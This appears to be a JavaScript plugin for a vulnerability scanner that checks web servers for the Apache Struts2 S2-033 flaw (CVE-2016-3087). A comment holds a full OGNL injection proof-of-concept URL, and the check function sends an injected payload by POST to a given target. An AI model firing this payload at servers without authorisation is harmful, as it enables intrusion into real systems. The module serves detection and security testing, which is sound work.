
module.exports={
	tags:"struts2,033,cve-2016-3087,20163087",
	des:"CVE-2016-3087,struts2 033漏洞检测",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-033",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-033.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-033",
		"https://nvd.nist.gov/vuln/detail/CVE-2016-3087"],
	suport:g_szMyMsg,
	/*
s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this;
		var szOldUrl = url;
		url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
		request(fnOptHeader({method: 'POST',uri: url}),
	    	function(e,r,b)
	    {
	    	fnDoBody(b,"s2-033",szOldUrl,null,function(o)
	    	{
	    		var r = {"url":szOldUrl,"send":url};
  				fnCbk(global.copyO2O(r,o),_t);
	    	});
	    });
	}
};